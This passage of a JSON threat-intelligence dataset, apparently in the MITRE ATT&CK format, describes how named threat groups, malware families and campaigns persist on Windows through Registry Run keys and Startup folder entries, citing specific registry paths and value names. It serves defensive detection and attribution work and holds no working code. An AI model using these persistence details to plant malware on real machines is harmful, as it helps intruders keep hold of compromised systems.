                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> places scripts in the startup folder for persistence.[19]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> established persistence using Registry Run keys, both to execute PowerShell and VBS scripts as well as to execute their backdoor directly.[20][21][22]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has deployed a tool known as DarkComet to the Startup folder of a victim, and used Registry run keys to gain persistence.[23][24]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name>'s has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\.[25][26]"
                    },
                    "G0087": {
                        "ID": "G0087",
                        "Name": "APT39",
                        "Description": "<name> has maintained persistence using the startup folder.[27]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> created and modified startup files for persistence.[28][29] <name> added a registry key in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost to establish persistence for Cobalt Strike.[30]"
                    },
                    "S0456": {
                        "ID": "S0456",
                        "Name": "Aria-body",
                        "Description": "<name> has established persistence via the Startup folder or Run Registry key.[31]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> creates a startup item for persistence. [32]"
                    },
                    "S1029": {
                        "ID": "S1029",
                        "Name": "AuTo Stealer",
                        "Description": "<name> can place malicious executables in a victim's AutoRun registry key or StartUp directory, depending on the AV product installed, to maintain persistence.[33]"
                    },
                    "S0640": {
                        "ID": "S0640",
                        "Name": "Avaddon",
                        "Description": "<name> uses registry run keys for persistence.[34]"
                    },
                    "S1053": {
                        "ID": "S1053",
                        "Name": "AvosLocker",
                        "Description": "<name> has been executed via the RunOnce Registry key to run itself on safe mode.[35]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has added a Registry key to ensure all future macros are enabled for Microsoft Word and Excel as well as for additional persistence.[36][37]"
                    },
                    "S0093": {
                        "ID": "S0093",
                        "Name": "Backdoor.Oldrea",
                        "Description": "<name> adds Registry Run keys to achieve persistence.[38][39]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "<name> achieves persistence by creating a shortcut to itself in the CSIDL_STARTUP directory.[40]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> installs a registry Run key to establish persistence.[41]"
                    },
                    "S0337": {
                        "ID": "S0337",
                        "Name": "BadPatch",
                        "Description": "<name> establishes a foothold by adding a link to the malware executable in the startup folder.[42]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can create or add files to Registry Run Keys to establish persistence.[43][44]"
                    },
                    "S0127": {
                        "ID": "S0127",
                        "Name": "BBSRAT",
                        "Description": "<name> has been loaded through DLL side-loading of a legitimate Citrix executable that is set to persist through the Registry Run key location HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\ssonsvr.exe."
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has added itself to the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\CurrentVersion\\Run\\ for persistence.[45][46]"
                    },
                    "S0570": {
                        "ID": "S0570",
                        "Name": "BitPaymer",
                        "Description": "<name> has set the run key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[47]"
                    },
                    "S0089": {
                        "ID": "S0089",
                        "Name": "BlackEnergy",
                        "Description": "The <name> 3 variant drops its main DLL component and then creates a .lnk shortcut to that file in the startup folder.[48]"
                    },
                    "S0635": {
                        "ID": "S0635",
                        "Name": "BoomBox",
                        "Description": "<name> can establish persistence by writing the Registry value MicroNativeCacheSvc to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[49]"
                    },
                    "S0204": {
                        "ID": "S0204",
                        "Name": "Briba",
                        "Description": "<name> creates run key Registry entries pointing to malicious DLLs dropped to disk.[50]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used a batch script that adds a Registry Run key to establish malware persistence.[51]"
                    },
                    "S0471": {
                        "ID": "S0471",
                        "Name": "build_downer",
                        "Description": "<name> has the ability to add itself to the Registry Run key for persistence.[52]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> stores a configuration files in the startup directory to automatically execute commands in order to persist across reboots.[53]"
                    },
                    "S0484": {
                        "ID": "S0484",
                        "Name": "Carberp",
                        "Description": "<name> has maintained persistence by placing itself inside the current user's startup folder.[54]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> establishes Persistence by setting the  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load Registry key to point to its executable.[55]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has added persistence via the Registry key software\\microsoft\\windows\\currentversion\\run\\microsoft windows html help.[56]"
                    },
                    "S0144": {
                        "ID": "S0144",
                        "Name": "ChChes",
                        "Description": "<name> establishes persistence by adding a Registry Run key.[57]"
                    },
                    "S1041": {
                        "ID": "S1041",
                        "Name": "Chinoxy",
                        "Description": "<name> has established persistence via the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run registry key and by loading a dropper to (%COMMON_ STARTUP%\\\\eoffice.exe).[58]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can establish persistence by adding a Registry run key.[59][60]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used Registry Run keys for persistence. The group has also set a Startup path to launch the PowerShell shell command and download Cobalt Strike.[61]"
                    },
                    "S0338": {
                        "ID": "S0338",
                        "Name": "Cobian RAT",
                        "Description": "<name> creates an autostart Registry key to ensure persistence.[62]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> achieves persistence by adding a shortcut of itself to the startup path in the Registry.[63]"
                    },
                    "S0608": {
                        "ID": "S0608",
                        "Name": "Conficker",
                        "Description": "<name> adds Registry Run keys to establish persistence.[64]"
                    },
                    "G0142": {
                        "ID": "G0142",
                        "Name": "Confucius",
                        "Description": "<name> has dropped malicious files into the startup folder %AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup on a compromised host in order to maintain persistence.[65]"
                    },
                    "S0137": {
                        "ID": "S0137",
                        "Name": "CORESHELL",
                        "Description": "<name> has established persistence by creating autostart extensibility point (ASEP) Registry entries in the Run key and other Registry keys, as well as by creating shortcuts in the Internet Explorer Quick Start folder.[66]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "One persistence mechanism used by <name> is to set itself to be executed at system startup by adding a Registry value under one of the following Registry keys: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run[67]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> can add Registry run keys for persistence.[68][69]"
                    },
                    "S0235": {
                        "ID": "S0235",
                        "Name": "CrossRAT",
                        "Description": "<name> uses run keys for persistence on Windows.[70]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name>'s version of Bandook adds a registry key to HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[70]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> adds several Registry entries to enable automatic execution at every system startup.[71][72]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> installation includes AutoIt script execution creating a shortcut to itself as an LNK object, such as bill.lnk, in the victim startup folder.[73] <name> installation finishes with the creation of a registry Run key.[73]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has been known to establish persistence by adding programs to the Run Registry key.[74]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> has established persistence via the Software\\Microsoft\\Windows NT\\CurrentVersion\\Run registry key and by creating a .lnk shortcut file in the Windows startup folder.[75]"
                    },
                    "S1021": {
                        "ID": "S1021",
                        "Name": "DnsSystem",
                        "Description": "<name> can write itself to the Startup folder to gain persistence.[76]"
                    },
                    "S0186": {
                        "ID": "S0186",
                        "Name": "DownPaper",
                        "Description": "<name> uses PowerShell to add a Registry Run key in order to establish persistence.[77]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has added the registry value ntdll to the Registry Run key to establish persistence.[78]"
                    },
                    "S0062": {
                        "ID": "S0062",
                        "Name": "DustySky",
                        "Description": "<name> achieves persistence by creating a Registry entry in HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[79]"
                    },
                    "S0081": {
                        "ID": "S0081",
                        "Name": "Elise",
                        "Description": "If establishing persistence by installation as a new service fails, one variant of <name> establishes persistence for the created .exe file by setting the following Registry key: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchost : %APPDATA%\\Microsoft\\Network\\svchost.exe. Other variants have set the following Registry keys for persistence: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\imejp : [self] and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\IAStorD.[80][81]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "Variants of <name> have added Run Registry keys to establish persistence.[82]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has been observed adding the downloaded payload to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to maintain persistence.[83][84][85]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> can modify the registry run keys HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run and HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[86]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has created Registry keys for persistence in [HKLM|HKCU]\\\u2026\\CurrentVersion\\Run.[87]"
                    },
                    "S0152": {
                        "ID": "S0152",
                        "Name": "EvilGrab",
                        "Description": "<name> adds a Registry Run key for ctfmon.exe to establish persistence.[57]"
                    },
                    "S0568": {
                        "ID": "S0568",
                        "Name": "EVILNUM",
                        "Description": "<name> can achieve persistence through the Registry Run key.[88][89]"
                    },
                    "S0512": {
                        "ID": "S0512",
                        "Name": "FatDuke",
                        "Description": "<name> has used HKLM\\SOFTWARE\\Microsoft\\CurrentVersion\\Run to establish persistence.[90]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> adds a shortcut file to the startup folder for persistence.[91]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has established persistence by using the Registry option in PowerShell Empire to add a Run key.[92][86]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has used Windows Registry run keys such as, HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\hosts to maintain persistence.[93]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used Registry Run keys to establish persistence for its downloader tools known as HARDTACK and SHIPBREAD.[94]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> malware has created Registry Run and RunOnce keys to establish persistence, and has also added items to the Startup folder.[95][96]"
                    },
                    "S0355": {
                        "ID": "S0355",
                        "Name": "Final1stspy",
                        "Description": "<name> creates a Registry Run key to establish persistence.[97]"
                    },
                    "S0182": {
                        "ID": "S0182",
                        "Name": "FinFisher",
                        "Description": "<name> establishes persistence by creating the Registry key HKCU\\Software\\Microsoft\\Windows\\Run.[98][99]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> has dropped an executable file to the startup directory.[100]"
                    },
                    "S0036": {
                        "ID": "S0036",
                        "Name": "FLASHFLOOD",
                        "Description": "<name> achieves persistence by making an entry in the Registry's Run key.[40]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has established persistence via the HKCU\\SOFTWARE\\microsoft\\windows\\currentversion\\run registry key.[10]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can use a Registry Run Key and the Startup folder to establish persistence.[58]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> tools have registered Run keys in the registry to give malicious VBS files persistence.[101][102][103]"
                    },
                    "S0168": {
                        "ID": "S0168",
                        "Name": "Gazer",
                        "Description": "<name> can establish persistence by creating a .lnk file in the Start menu.[104][105]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can set persistence with a Registry run key.[106]"
                    },
                    "S0032": {
                        "ID": "S0032",
                        "Name": "gh0st RAT",
                        "Description": "<name> has added a Registry Run key to establish persistence.[107][108]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> establishes persistence in the Startup folder.[109]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can create a .lnk file and add a Registry Run key to establish persistence.[110]"
                    },
                    "S0531": {
                        "ID": "S0531",
                        "Name": "Grandoreiro",
                        "Description": "<name> can use run keys and create link files in the startup folder for persistence.[111][112]"
                    },
                    "S0417": {
                        "ID": "S0417",
                        "Name": "GRIFFON",
                        "Description": "<name> has used a persistence module that stores the implant inside the Registry, which executes at logon.[113]"
                    },
                    "S0632": {
                        "ID": "S0632",
                        "Name": "GrimAgent",
                        "Description": "<name> can set persistence with a Registry run key.[114]"
                    },
                    "S0561": {
                        "ID": "S0561",
                        "Name": "GuLoader",
                        "Description": "<name> can establish persistence via the Registry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.[115]"
                    },
                    "S0499": {
                        "ID": "S0499",
                        "Name": "Hancitor",
                        "Description": "<name>  has added Registry Run keys to establish persistence.[116]"
                    },
                    "S0170": {
                        "ID": "S0170",
                        "Name": "Helminth",
                        "Description": "<name> establishes persistence by creating a shortcut in the Start Menu folder.[117]"
                    },
                    "S1027": {
                        "ID": "S1027",
                        "Name": "Heyoka Backdoor",
                        "Description": "<name> can establish persistence with the auto start function including using the value EverNoteTrayUService.[118]"
                    },
                    "S0087": {
                        "ID": "S0087",
                        "Name": "Hi-Zor",
                        "Description": "<name> creates a Registry Run key to establish persistence.[119]"
                    },
                    "G0126": {
                        "ID": "G0126",
                        "Name": "Higaisa",
                        "Description": "<name> added a spoofed binary to the start-up folder for persistence.[120][121]"
                    },
                    "S0070": {
                        "ID": "S0070",
                        "Name": "HTTPBrowser",
                        "Description": "<name> has established persistence by setting the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key value for wdm to the path of the executable. It has also used the Registry entry HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Run vpdn \"%ALLUSERPROFILE%\\%APPDATA%\\vpdn\\VPDN_LU.exe\" to establish persistence.[122][123]"
                    },
                    "S0483": {
                        "ID": "S0483",
                        "Name": "IcedID",
                        "Description": "<name> has established persistence by creating a Registry run key.[124]"
                    },
                    "G0100": {
                        "ID": "G0100",
                        "Name": "Inception",
                        "Description": "<name> has maintained persistence by modifying Registry run key value  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\.[125]"
                    },
                    "S0259": {
                        "ID": "S0259",
                        "Name": "InnaputRAT",
                        "Description": "Some <name> variants establish persistence by modifying the Registry key HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Run:%appdata%\\NeutralApp\\NeutralApp.exe.[126]"
                    },
                    "S0260": {
                        "ID": "S0260",
                        "Name": "InvisiMole",
                        "Description": "<name> can place a lnk file in the Startup Folder to achieve persistence.[127]"
                    },
                    "S0015": {
                        "ID": "S0015",
                        "Name": "Ixeshe",
                        "Description": "<name> can achieve persistence by adding itself to the HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[128]"
                    },
                    "S0389": {
                        "ID": "S0389",
                        "Name": "JCry",
                        "Description": "<name> has created payloads in the Startup directory to maintain persistence. [129]"
                    },
                    "S0044": {
                        "ID": "S0044",
                        "Name": "JHUHUGIT",
                        "Description": "<name> has used a Registry Run key to establish persistence by executing JavaScript code within the rundll32.exe process.[130]"
                    },
                    "S0088": {
                        "ID": "S0088",
                        "Name": "Kasidet",
                        "Description": "<name> creates a Registry Run key to establish persistence.[131][132]"
                    },
                    "S0265": {
                        "ID": "S0265",
                        "Name": "Kazuar",
                        "Description": "<name> adds a sub-key under several Registry run keys.[133]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "Several <name> backdoors achieved persistence by adding a Run key.[134]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has placed scripts in the startup folder for persistence and modified the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce Registry key.[135][37][136][137][138]"
                    },
                    "S0250": {
                        "ID": "S0250",
                        "Name": "Koadic",
                        "Description": "<name> has added persistence to the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[139]"
                    },
                    "S0669": {
                        "ID": "S0669",
                        "Name": "KOCTOPUS",
                        "Description": "<name> can set the AutoRun Registry key with a PowerShell command.[139]"
                    },
                    "S0356": {
                        "ID": "S0356",
                        "Name": "KONNI",
                        "Description": "A version of <name> has dropped a Windows shortcut into the Startup folder to establish persistence.[140]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has maintained persistence by loading malicious code into a startup folder or by adding a Registry Run key.[141][142][143][144]"
                    },
                    "G0140": {
                        "ID": "G0140",
                        "Name": "LazyScripter",
                        "Description": "<name> has achieved persistence via writing a PowerShell script to the autorun registry key.[139]"
                    },
                    "G0065": {
                        "ID": "G0065",
                        "Name": "Leviathan",
                        "Description": "<name> has used JavaScript to create a shortcut file in the Startup folder that points to its main backdoor.[145][146]"
                    },
                    "S0513": {
                        "ID": "S0513",
                        "Name": "LiteDuke",
                        "Description": "<name> can create persistence by adding a shortcut in the CurrentVersion\\Run Registry key.[90]"
                    },
                    "S0397": {
                        "ID": "S0397",
                        "Name": "LoJax",
                        "Description": "<name> has modified the Registry key \u2018HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\u2019 from \u2018autocheck autochk \u2019 to \u2018autocheck autoche \u2019 in order to execute its payload during Windows startup.[147]"
                    },
                    "S0582": {
                        "ID": "S0582",
                        "Name": "LookBack",
                        "Description": "<name> sets up a Registry Run key to establish a persistence mechanism.[148]"
                    },
                    "S0532": {
                        "ID": "S0532",
                        "Name": "Lucifer",
                        "Description": "<name> can persist by setting Registry key values HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic and HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\QQMusic.[149]"
                    },
                    "G1014": {
                        "ID": "G1014",
                        "Name": "LuminousMoth",
                        "Description": "<name> has used malicious DLLs that setup persistence in the Registry Key HKCU\\Software\\Microsoft\\Windows\\Current Version\\Run.[150][151]"
                    },
                    "S0409": {
                        "ID": "S0409",
                        "Name": "Machete",
                        "Description": "<name> used the startup folder for persistence.[152][153]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> malware has used Registry Run keys to establish persistence.[154][155][156]"
                    },
                    "S0652": {
                        "ID": "S0652",
                        "Name": "MarkiRAT",
                        "Description": "<name> can drop its payload into the Startup directory to ensure it automatically runs when the compromised system is started.[157]"
                    },
                    "S0167": {
                        "ID": "S0167",
                        "Name": "Matryoshka",
                        "Description": "<name> can establish persistence by adding Registry Run keys.[158][159]"
                    },
                    "S0449": {
                        "ID": "S0449",
                        "Name": "Maze",
                        "Description": "<name> has created a file named \"startup_vrun.bat\" in the Startup folder of a virtual machine to establish persistence.[160]"
                    },
                    "S0500": {
                        "ID": "S0500",
                        "Name": "MCMD",
                        "Description": "<name> can use Registry Run Keys for persistence.[161]"
                    },
                    "S0455": {
                        "ID": "S0455",
                        "Name": "Metamorfo",
                        "Description": "<name> has configured persistence to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run, Spotify =% APPDATA%\\Spotify\\Spotify.exe and used .LNK files in the startup folder to achieve persistence.[162][163][164][165]"
                    },
                    "S1122": {
                        "ID": "S1122",
                        "Name": "Mispadu",
                        "Description": "<name> creates a link in the startup folder for persistence.[166] <name> adds persistence via the registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[167]"
                    },
                    "S0080": {
                        "ID": "S0080",
                        "Name": "Mivast",
                        "Description": "<name> creates the following Registry entry: HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Micromedia.[168]"
                    },
                    "S0553": {
                        "ID": "S0553",
                        "Name": "MoleNet",
                        "Description": "<name> can achieve persitence on the infected machine by setting the Registry run key.[169]"
                    },
                    "G0021": {
                        "ID": "G0021",
                        "Name": "Molerats",
                        "Description": "<name> saved malicious files within the AppData and Startup folders to maintain persistence.[170]"
                    },
                    "S1026": {
                        "ID": "S1026",
                        "Name": "Mongall",
                        "Description": "<name> can establish persistence with the auto start function including using the value EverNoteTrayUService.[118]"
                    },
                    "S0256": {
                        "ID": "S0256",
                        "Name": "Mosquito",
                        "Description": "<name> establishes persistence under the Registry key HKCU\\Software\\Run auto_update.[171]"
                    },
                    "G0069": {
                        "ID": "G0069",
                        "Name": "MuddyWater",
                        "Description": "<name> has added Registry Run key KCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\SystemTextEncoding to establish persistence.[172][173][174][175][176][177]"
                    },
                    "G0129": {
                        "ID": "G0129",
                        "Name": "Mustang Panda",
                        "Description": "<name> has created the registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run\\AdobelmdyU to maintain persistence.[178]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has modified a victim's Windows Run registry to establish persistence.[179]"
                    },
                    "S0228": {
                        "ID": "S0228",
                        "Name": "NanHaiShu",
                        "Description": "<name> modifies the %regrun% Registry to point itself to an autostart mechanism.[180]"
                    },
                    "S0336": {
                        "ID": "S0336",
                        "Name": "NanoCore",
                        "Description": "<name> creates a RunOnce key in the Registry to execute its VBS scripts each time the user logs on to the machine.[181]"
                    },
                    "S0247": {
                        "ID": "S0247",
                        "Name": "NavRAT",
                        "Description": "<name> creates a Registry key to ensure a file gets executed upon reboot in order to establish persistence.[182]"
                    },
                    "S0630": {
                        "ID": "S0630",
                        "Name": "Nebulae",
                        "Description": "<name> can achieve persistence through a Registry Run key.[179]"
                    },
                    "S0034": {
                        "ID": "S0034",
                        "Name": "NETEAGLE",
                        "Description": "The \"SCOUT\" variant of <name> achieves persistence by adding itself to the HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[40]"
                    },
                    "S0198": {
                        "ID": "S0198",
                        "Name": "NETWIRE",
                        "Description": "<name> creates a Registry start-up entry to establish persistence.[183][184][115][185]"
                    },
                    "S0385": {
                        "ID": "S0385",
                        "Name": "njRAT",
                        "Description": "<name> has added persistence via the Registry key HKCU\\Software\\Microsoft\\CurrentVersion\\Run\\ and dropped a shortcut in %STARTUP%.[186][187]"
                    },
                    "S0353": {
                        "ID": "S0353",
                        "Name": "NOKKI",
                        "Description": "<name> has established persistence by writing the payload to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.[188]"
                    },
                    "S0644": {
                        "ID": "S0644",
                        "Name": "ObliqueRAT",
                        "Description": "<name> can gain persistence by a creating a shortcut in the infected user's Startup directory.[189]"
                    },
                    "S0340": {
                        "ID": "S0340",
                        "Name": "Octopus",
                        "Description": "<name> achieved persistence by placing a malicious executable in the startup directory and has added the HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run key to the Registry.[190]"
                    },
                    "S0439": {
                        "ID": "S0439",
                        "Name": "Okrum",
                        "Description": "<name> establishes persistence by creating a .lnk shortcut to itself in the Startup folder.[191]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group placed LNK files into the victims' startup folder for persistence.[192]"
                    },
                    "C0013": {
                        "ID": "C0013",
                        "Name": "Operation Sharpshooter",
                        "Description": "During <name>, a first-stage downloader installed Rising Sun to %Startup%\\mssync.exe on a compromised host.[193]"
                    },
                    "G0040": {
                        "ID": "G0040",
                        "Name": "Patchwork",
                        "Description": "<name> has added the path of its second-stage malware to the startup folder to achieve persistence. One of its file stealers has also persisted by adding a Registry Run key.[194][195]"
                    },
                    "S0124": {
                        "ID": "S0124",
                        "Name": "Pisloader",
                        "Description": "<name> establishes persistence via a Registry Run key.[196]"
                    },
                    "S0254": {
                        "ID": "S0254",
                        "Name": "PLAINTEE",
                        "Description": "<name> gains persistence by adding the Registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce.[197]"
                    },
                    "S0013": {
                        "ID": "S0013",
                        "Name": "PlugX",
                        "Description": "<name> adds Run key entries in the Registry to establish persistence.[198][57][199]"
                    },
                    "S0428": {
                        "ID": "S0428",
                        "Name": "PoetRAT",
                        "Description": "<name> has added a registry key in the  hive for persistence.[200]"
                    },
                    "S0012": {
                        "ID": "S0012",
                        "Name": "PoisonIvy",
                        "Description": "<name> creates run key Registry entries pointing to a malicious executable dropped to disk.[201]"
                    },
                    "S0139": {
                        "ID": "S0139",
                        "Name": "PowerDuke",
                        "Description": "<name> achieves persistence by using various Registry Run keys.[202]"
                    },
                    "S0441": {
                        "ID": "S0441",
                        "Name": "PowerShower",
                        "Description": "<name> sets up persistence with a Registry run key.[203]"
                    },
                    "S0145": {
                        "ID": "S0145",
                        "Name": "POWERSOURCE",
                        "Description": "<name> achieves persistence by setting a Registry Run key, with the path depending on whether the victim account has user or administrator access.[204]"
                    },
                    "S0194": {
                        "ID": "S0194",
                        "Name": "PowerSploit",
                        "Description": "<name>'s New-UserPersistenceOption Persistence argument can be used to establish via the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Registry key.[205][206]"
                    },
                    "S0371": {
                        "ID": "S0371",
                        "Name": "POWERTON",
                        "Description": "<name> can install a Registry Run key for persistence.[207]"
                    },
                    "S0113": {
                        "ID": "S0113",
                        "Name": "Prikormka",
                        "Description": "<name> adds itself to a Registry Run key with the name guidVGA or guidVSA.[208]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has used Registry run keys to establish persistence.[209]"
                    },
                    "S0147": {
                        "ID": "S0147",
                        "Name": "Pteranodon",
                        "Description": "<name> copies itself to the Startup folder to establish persistence.[210]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> has been observed using a Registry Run key.[211][212]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> adds itself to the startup folder or adds itself to the Registry key SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[213]"
                    },
                    "G0024": {
                        "ID": "G0024",
                        "Name": "Putter Panda",
                        "Description": "A dropper used by <name> installs itself into the ASEP Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run with a value named McUpdate.[214]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can maintain persistence by creating an auto-run Registry key.[215][216][217][218]"
                    },
                    "S0262": {
                        "ID": "S0262",
                        "Name": "QuasarRAT",
                        "Description": "If the <name> client process does not have administrator privileges it will add a registry key to HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[219][220]"
                    },
                    "S0458": {
                        "ID": "S0458",
                        "Name": "Ramsay",
                        "Description": "<name> has created Registry Run keys to establish persistence.[221]"
                    },
                    "S0662": {
                        "ID": "S0662",
                        "Name": "RCSession",
                        "Description": "<name> has the ability to modify a Registry Run key to establish persistence.[59][222]"
                    },
                    "S0172": {
                        "ID": "S0172",
                        "Name": "Reaver",
                        "Description": "<name> creates a shortcut file and saves it in a Startup folder to establish persistence.[223]"
                    },
                    "S0153": {
                        "ID": "S0153",
                        "Name": "RedLeaves",
                        "Description": "<name> attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails, it attempts to add Registry Run keys.[57][224]"
                    },
                    "S0332": {
                        "ID": "S0332",
                        "Name": "Remcos",
                        "Description": "<name> can add itself to the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence.[225]"
